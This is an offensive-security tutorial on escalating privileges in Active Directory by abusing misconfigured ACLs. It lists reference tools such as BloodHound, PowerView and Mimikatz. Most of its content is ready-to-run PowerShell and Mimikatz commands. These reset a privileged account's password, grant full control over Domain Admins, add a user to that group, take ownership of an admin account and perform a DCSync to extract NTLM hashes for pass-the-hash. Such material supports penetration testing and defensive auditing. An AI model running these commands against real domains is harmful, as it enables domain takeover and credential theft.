### References

- [BloodHound: Active Directory Attack Mapping](https://bloodhound.readthedocs.io/en/latest/)
    
- [PowerView: ACL Enumeration](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
    
- [Mimikatz: Windows Privilege Escalation](https://github.com/gentilkiwi/mimikatz)
    
- [HackTricks: Windows ACL Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privilege-escalation-via-acls)
    

---

## Understanding ACL Abuse in Active Directory

Access Control Lists (ACLs) define permissions on AD objects such as users, groups, and computers. Misconfigurations in ACLs can allow privilege escalation by granting excessive rights to unprivileged users.

Key permissions that can be exploited:

- **GenericAll** – Full control over the object
    
- **GenericWrite** – Modify attributes of the object
    
- **WriteOwner** – Change ownership of the object
    
- **WriteDACL** – Modify the ACL of the object
    
- **AllExtendedRights** – Perform privileged operations (e.g., resetting passwords)
    

---

## Identifying Vulnerable ACLs

### Enumerating ACLs Using PowerView

```powershell
Get-ObjectAcl -DistinguishedName "CN=Domain Admins,CN=Users,DC=corp,DC=com" -ResolveGUIDs | Format-Table SecurityIdentifier,ActiveDirectoryRights
```

This checks ACLs applied to the `Domain Admins` group and lists security identifiers (SIDs) with permissions.

### Converting SIDs to Usernames

If a SID appears with `GenericAll` or `WriteDACL`, convert it to a username:

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

This helps identify accounts that can modify privileged objects.

---

## Exploiting `GenericAll` for Privilege Escalation

If a low-privileged user has `GenericAll` on a privileged account, they can reset the password.

### Resetting Password for Privileged Account

1. Identify the vulnerable user (e.g., `backupadmin` has `GenericAll` on `admin`).
    
2. Change the password:
    
    ```powershell
    Set-DomainUserPassword -Identity admin -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
    ```
    
3. Log in with the new credentials:
    
    ```powershell
    net use \\dc01 /user:corp\admin NewPass123!
    ```
    

Now, the user has escalated privileges to the target account.

---

## Exploiting `WriteDACL` for Privilege Escalation

If a user has `WriteDACL` on a privileged object, they can modify permissions to grant themselves full control.

### Granting `GenericAll` to an Account

```powershell
Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "user1" -Rights GenericAll
```

Now, `user1` has full control over the `Domain Admins` group and can add themselves as a member.

### Adding User to `Domain Admins`

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members user1
```

This grants domain admin privileges.

---

## Exploiting `WriteOwner` for Privilege Escalation

Users with `WriteOwner` can take ownership of an object and modify its permissions.

### Taking Ownership of a Privileged Account

```powershell
Set-DomainObjectOwner -Identity "admin" -OwnerIdentity "user1"
```

### Granting Full Control

```powershell
Add-ObjectAcl -TargetIdentity "admin" -PrincipalIdentity "user1" -Rights GenericAll
```

Now, `user1` has full control over `admin` and can reset its password.

---

## DCSync Attack via `Replicating Directory Changes`

If an account has `Replicating Directory Changes` on the domain root, it can extract password hashes using Mimikatz.

### Checking for DCSync Privileges

```powershell
Get-ObjectAcl -DistinguishedName "DC=corp,DC=com" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match "Replicating")}
```

### Extracting Hashes

```powershell
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
```

If successful, this retrieves NTLM hashes for domain users, allowing pass-the-hash attacks.